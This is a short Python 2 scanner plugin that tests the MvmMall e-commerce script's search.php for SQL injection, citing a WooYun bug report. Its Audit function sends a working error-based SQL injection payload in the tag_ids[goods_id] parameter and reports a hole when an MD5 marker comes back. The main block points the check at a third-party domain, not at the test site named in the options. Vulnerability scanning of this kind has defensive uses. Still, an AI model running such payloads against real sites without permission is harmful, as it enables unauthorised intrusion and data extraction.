#!/usr/bin/python2.7
#coding:utf-8

import urllib2
from dummy import *
import re

info = {
	'NAME':'MvmMall search.php SQL Injection',
	'AUTHOR':'wjk',
	'TIME':'20150325',
	'WEB':'',
	'DESCRIPTION':'MvmMall SQL INJECTION,http://www.wooyun.org/bugs/wooyun-2011-01732'
}
opts = {
	'url':'http://testasp.vulnweb.com',	#'target ip'
}
# opts = [
# 	['url','http://testasp.vulnweb.com','target url'],
# ]

def Assign(services):
	if services.has_key('url') and services.has_key('cms'):
		if services['cms'] == 'mvmmall':
			return True
	return False

def Audit(services):
	url = services['url'] +"/search.php?tag_ids[goods_id]=uid))%20and(select%201%20from(select%20count(*),concat((select%20(select%20md5(12345))%20from%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%20and%201=1%23"
	try:
		ul = urllib2.urlopen(url)
		content = ul.read()
		if content.find('827ccb0eea8a706c4c34a16891f84e7b') != -1:
			security_hole(url)
	except:
		pass
# ----------------------------------------------------------------------------------------------------
#	untest yet
# ----------------------------------------------------------------------------------------------------
if __name__=='__main__':
	services = {'url':'http://www.eguan.cn'}
	pprint(Audit(services))
	pprint(services)
